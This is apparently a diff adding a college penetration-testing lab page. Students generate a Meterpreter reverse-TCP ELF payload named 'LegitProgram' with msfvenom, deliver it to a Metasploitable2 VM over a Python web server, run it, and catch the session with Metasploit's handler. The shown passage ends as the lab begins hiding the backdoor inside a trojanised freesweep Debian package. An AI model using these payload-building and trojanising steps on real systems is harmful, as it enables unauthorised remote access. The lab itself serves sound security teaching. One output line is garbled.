+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Make an executable that is will be runnable on our Metasploitable2 VM, Linux host. That would be the <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>.elf</strong></span> file type. Windows would be <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>.exe</strong></span> file type. Pick a payload from the list that works on Linux, and ask <strong><em>msfvenom</em></strong> to package it for you and save it to the <strong><em>/tmp</em></strong> directory with the filename <strong><em>LegitProgram</em></strong>, <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>/tmp/LegitProgram</strong></span>. This payload is hardwired to connect back to the <strong>LHOST</strong> address, which should be the <strong><em>Kali Linux VM</em></strong> IP:</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Creating an Executable</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">msfvenom</span> --arch x86 --format elf --platform linux LHOST=192.168.1.x LPORT=4575 --payload linux/x86/meterpreter_reverse_tcp > /tmp/LegitProgram</span>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- D -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Change to the <strong><em>/tmp</em></strong> directory, and start a simple webserver in Kali Linux to host this <strong><em>LegitProgram</em></strong> binary. We're using this as a way to get the binary on the target machine since we're in control of both sides, but in reality this would be accomplished through some social engineering attack.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Hosting the Social Engineering Exploit</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">cd</span> /tmp</span><br /><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Built-in Webserver in Python 2</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">python2</span> -m SimpleHTTPServer 8888</span><br /><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Alternative Built-in Webserver in Python 3</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">python3</span> -m http.server 8888</span><br /><br />
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+    </ol>
+  </li>
+</ol>
+
+<!-- 3.2 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="2">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Metasploitable2 VM</em></strong>, download the file from the <strong><em>Kali Linux VM</em></strong> webserver:</span></p>
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Download Exploit</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">wget </span> 192.168.1.x:8888/LegitProgram</span><br />
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- WARNING YELLOW -->
+    <blockquote>
+      <table border="0" style="border-collapse: collapse; width: 75%; background-color: #fbeeb8; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+        <tbody>
+          <tr>
+            <td style="width: 2%; background-color: #e67e23;">&nbsp;</td>
+            <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+              <p style="margin: 0; padding: 0;"><img src="https://web.acd.ccac.edu/~mkisow/assets/yellow-warning-24x24.svg"  style="border: 0px solid #000000;" height="24" width="24" alt="warning"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #e67e23; font-size: 14pt;">WARNING</span></strong></p>
+            </td>
+          </tr>
+          <tr>
+            <td style="width: 2%; background-color: #e67e23;">&nbsp;</td>
+            <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #e67e23; font-size: 12pt;">&#x25CF;</span></strong></td>
+            <td style="width: 93%;">
+              <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #e67e23; font-size: 12pt;">If you have to re-run this wget command for any reason and leave the original file in place, the next file will be named LegitProgram.1, LegitProgram.2, etc, as shown in the wget output. You can either delete the older copy before running <strong><em>wget</em></strong> again or make a note of what the most recent file name is.</span></p>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </blockquote>
+
+    <!-- NOTE BLUE -->
+    <blockquote>
+      <table border="0" style="border-collapse: collapse; width: 75%; background-color: #c2e0f4; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+        <tbody>
+          <tr>
+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td colspan="2" style="width: 98%; text-align: left; vertical-align: top;">
+              <p style="margin: 0; padding: 0;"><img src="https://web.acd.ccac.edu/~mkisow/assets/blue-note-22x22.svg"  width="22" height="22" style="border: 0px solid #000000;" alt="note"/><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 14pt;">NOTE</span></strong></p>
+            </td>
+          </tr>
+          <tr>
+            <td style="width: 2%; background-color: #236fa1;">&nbsp;</td>
+            <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">&#x25CF;</span></strong></td>
+            <td style="width: 93%;">
+              <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #236fa1; font-size: 12pt;">At this point, you can <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>CTRL-C</strong></span> on the web server; we don't need it any more. </span></p>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </blockquote>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 3.3 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="3">
+  <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Kali Linux VM</em></strong>, start the reverse shell for the payload you created in <em>Step 3.1</em>.</span></p><br />
+    <ol style="list-style-type: lower-alpha;" start="a">
+
+      <!-- A -->
+      <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Use the generic payload handler that provides Metasploit features to exploits run outside of the framework. Configure it for the payload you just downloaded on the target (<strong>Metasploitable2 VM</strong>), as it needs to know.</span></p>
+        <ol style="list-style-type: lower-roman;" start="i">
+          <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">What payload is incoming.</span></p></li>
+          <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">What IP the payload is connecting to.</span></p></li>
+          <li><p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">What port the payload is connecting to.</span></p></li>
+          <p></p>
+        </ol>
+
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Start Metasploit</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">use</span> exploit/multi/handler</span><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set</span> PAYLOAD linux/x86/meterpreter_reverse_tcp</span><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set</span> LHOST 192.168.1.x</span><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set</span> LPORT 4575</span><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">set</span> ExitOnSession false</span><br />
+                  </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- B -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Run this service in the background as a job.</span></p>    
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Run in Background</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">exploit</span> -j</span>
+                  </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+    </ol>
+  </li>
+</ol>
+
+<!-- 3.4 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="4">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Metasploitable2 VM</em></strong>, Run the Payload.</span></p>
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Start Payload as Executable</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">chmod</span> +x LegitProgram</span><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">./LegitProgram</span></span><br />
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+<!-- 3.5 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="5">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">You should see a notice on your <strong><em>Kali Linux VM</em></strong>, that a new session was opened.</span></p>
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Session Opened</span></strong><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;[*] Meterpreter session 1 opened (192.168.1.2:4575 -> 192.168.1.4:36473) at 2023-12-77 19:53:42 -0500$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">chmod</span> +x LegitProgram</span><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sessions</span> --list</span><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">sessions</span> -i <em>x</em></span></strong><br /><br />
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Where <em>x</em> = num of your original exploit<br /></span></strong>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+
+    <!-- 3.5 DELIVERABLE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #ced4d9; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="5" style="width: 98%; text-align: left; vertical-align: top;">
+            <p style="margin: 0; padding: 0;">
+              <img src="https://web.acd.ccac.edu/~mkisow/assets/black-deliverable-24x24.svg"  style="border: 0px solid #000000;" height="24" width="24" alt="deliverable"/>
+              <strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;">DELIVERABLE</span></strong>
+            </p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td style="width: 5%; text-align: right; vertical-align: top;"><strong><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">3.5</span></strong></td>
+          <td colspan="3" style="width: 93%;"></td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>A.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Submit a screenshot of your Kali Linux <em>msfconsole</em> showing an active meterpreter session.</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>B.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Submit a screenshot of your Kali Linux <em>meterpreter</em> showing the output of "sysinfo."</span></p>
+          </td>
+        </tr>
+        <tr>
+          <td style="width: 2%; background-color: #000000;">&nbsp;</td>
+          <td colspan="2" style="width: 7%; text-align: right; vertical-align: top;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;"><strong>C.</strong></span></td>
+          <td colspan="2" style="width: 91%;">
+            <p style="margin: 0; padding: 0;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 12pt;">Submit a screenshot of your Metasploitable2 VM console showing the <em>LegitProgram</em> running.</span></p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ol>
+
+<!-- 3.6 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="6">
+  <li>
+    <p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Kali Linux VM</em></strong> exit the Metasploit shell</span>.</p>
+
+    <!-- CODE -->
+    <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+      <tbody>
+        <tr style="background-color: #ced4e9;">
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+          <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+        </tr>
+        <tr>
+          <td colspan="4" style="width: 99%;">
+            <p style="margin: 0; padding: 0;">
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Exit Shells<br /></span></strong>
+              <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;msf6> <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">quit</span></span></strong>
+            </p>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p></p>
+  </li>
+</ol>
+
+
+<!-- PART 4 -->
+<!-- <a href="##top8" style="color: #ba372a;">[TOP]</a> -->
+<hr />
+<p id="#payloadobf"><span style="font-family: arial, helvetica, sans-serif; font-size: 14pt; color: #ba372a;"><strong>Part 4 - Payload Obfuscation</strong></span></p>
+
+<blockquote>
+  <p style="text-align: justify;">
+    <span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Instead of overtly coercing the user into executing a suspicious program, a more stealthy approach involves bundling the backdoor alongside a seemingly legitimate application. In this scenario, we can craft a Linux installer package, specifically a Debian package (.deb file), for the popular Minesweeper game "freesweep". By incorporating the backdoor into the bundle, unsuspecting users are lured into installing what appears to be a harmless game, unaware of the additional surprise concealed within. This tactic capitalizes on the trust users place in familiar software, exploiting their complacency to facilitate unauthorized access or malicious activities on their system. This clandestine method underscores the importance of vigilance and robust security measures to counteract deceptive tactics employed by cyber adversaries.</span>
+  </p>
+</blockquote>
+
+<!-- 4.1 -->
+<ol style="font-family: arial, helvetica, sans-serif; font-size: 12pt;" start="1">
+  <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">On your <strong><em>Kali Linux VM</em></strong>, craft a payload for the freesweep application.</span></p>
+    <ol style="list-style-type: lower-alpha;" start="a">
+
+      <!-- A -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Download the legitimate <span style="font-family: 'courier new', courier, monospace; background-color: #ecdbdb; color: #ba372a;"><strong>.deb</strong></span> file from the package manager. Since we're going to run this on the OLD Metasploitable2 VM (32-bit), let's grab the correct binary out of the Ubuntu archives. That way, the dynamic library dependencies will work out OK.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Download Legitimate Package</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">mkdir</span> -p /tmp/working</span><br />
+                    <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">cd</span> /tmp/working</span><br />
+                      <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">wget</span> http://old-releases.ubuntu.com/ubuntu/pool/universe/f/freesweep/freesweep_0.88-4.3_i386.deb</span><br />
+                  </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- B -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Extract the files into that working directory.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #f44336; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #ffee58; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 2%; text-align: center; vertical-align: middle;"><span style="font-family: arial, helvetica, sans-serif; color: #66bb6a; font-size: 12pt;">&#11044;</span></td>
+              <td style="width: 94%; text-align: center;"><span style="font-family: arial, helvetica, sans-serif; color: #000000; font-size: 14pt;"><strong>CODE</strong></span></td>
+            </tr>
+            <tr>
+              <td colspan="4" style="width: 99%;">
+                <p style="margin: 0; padding: 0;">
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #2dc26b;">&nbsp;&nbsp;# Extract Package</span></strong><br />
+                  <strong><span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #ced4d9;">&nbsp;&nbsp;$ <span style="font-family: 'courier new', courier, monospace; font-size: 12pt; color: #236fa1;">dpkg</span> -x freesweep_0.88-4.3_i386.deb package</span>
+                </p>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <p></p>
+      </li>
+
+      <!-- C -->
+      <li><p><span style="font-family: arial, helvetica, sans-serif; font-size: 12pt;">Add a DEBIAN directory to contain the <em>payload</em> we are included in this package.</span></p>
+        <!-- CODE -->
+        <table border="0" style="border-collapse: collapse; width: 85%; background-color: #000000; font-family: 'courier new', courier, monospace; border-style: none; border-radius: 5px; box-shadow: 5px 5px 1px 0px rgba(50, 50, 50, 0.75); overflow: hidden;">
+          <tbody>
+            <tr style="background-color: #ced4e9;">
